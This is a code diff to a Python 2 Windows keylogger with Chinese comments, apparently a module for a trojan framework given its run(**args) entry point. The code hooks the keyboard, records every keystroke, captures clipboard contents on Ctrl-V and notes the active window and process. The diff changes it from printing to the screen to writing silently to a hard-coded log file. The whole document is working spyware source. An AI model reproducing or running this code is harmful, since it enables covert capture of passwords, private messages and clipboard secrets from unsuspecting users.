@@ -10,6 +10,9 @@ kernel32 = windll.kernel32
 psapi = windll.psapi
 current_window = None
 
+file_name = "C:\\Users\\lenovo\\Documents\\hook_log.txt" 
+fobj = open(file_name, 'w') 
+
 def get_current_process():
 
     # 获取前台窗口句柄
@@ -34,9 +37,7 @@ def get_current_process():
     length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
 
     # 输出进程相关信息
-    print
-    print "[ PID: %s - %s - %s]" % (process_id, executable.value, window_title.value)
-    print
+    fobj.write("[ PID: %s - %s - %s]" % (process_id, executable.value, window_title.value))
 
     # 关闭句柄
     kernel32.CloseHandle(hwnd)
@@ -52,7 +53,7 @@ def keyStore(event):
 
     # 检测按键是否为常规按键(非组合键等)
     if event.Ascii > 32 and event.Ascii < 127:
-        print chr(event.Ascii),
+        fobj.write(chr(event.Ascii) + ' ')
     else:
         # 若输入为[CTRL-V],则获取剪切板内容
         if event.Key == "V":
@@ -60,10 +61,10 @@ def keyStore(event):
             pasted_value = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
 
-            print "[PASTE] - %s" % (pasted_value),
+            fobj.write("[PASTE] - %s " % (pasted_value))
 
         else:
-            print "[%s]" % event.Key,
+            fobj.write("[%s] " % event.Key)
 
     # 返回直到下一个钩子事件被触发
     return True
@@ -77,4 +78,3 @@ def run(**args):
 # 注册键盘记录的钩子，然后永久执行
 	k1.HookKeyboard()
 	pythoncom.PumpMessages()
-
